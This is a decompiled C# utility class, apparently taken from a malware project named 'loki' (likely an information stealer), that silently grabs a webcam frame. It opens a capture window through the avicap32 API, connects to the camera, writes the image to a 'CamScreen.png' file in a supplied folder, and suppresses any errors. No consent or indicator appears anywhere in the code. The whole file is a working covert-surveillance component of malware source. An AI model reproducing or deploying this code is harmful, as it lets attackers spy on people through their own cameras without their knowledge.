using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace loki.loki.Utilies;

internal class GetWebCam
{
	private static object object_0;

	[CompilerGenerated]
	public static object smethod_0()
	{
		return object_0;
	}

	[DllImport("avicap32.dll")]
	[CompilerGenerated]
	public static extern IntPtr capCreateCaptureWindowA(string string_0, int int_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

	[DllImport("user32")]
	public static extern int SendMessage(IntPtr intptr_0, uint uint_0, int int_0, int int_1);

	internal static void get_webcam(string string_0)
	{
		try
		{
			IntPtr intPtr = Marshal.StringToHGlobalAnsi(string_0 + "\\CamScreen.png");
			IntPtr intptr_ = capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
			SendMessage(intptr_, 1034u, 0, 0);
			SendMessage(intptr_, 1034u, 0, 0);
			SendMessage(intptr_, 1049u, 0, intPtr.ToInt32());
			SendMessage(intptr_, 1035u, 0, 0);
			SendMessage(intptr_, 16u, 0, 0);
		}
		catch
		{
			Console.WriteLine("CamEror");
		}
	}
}
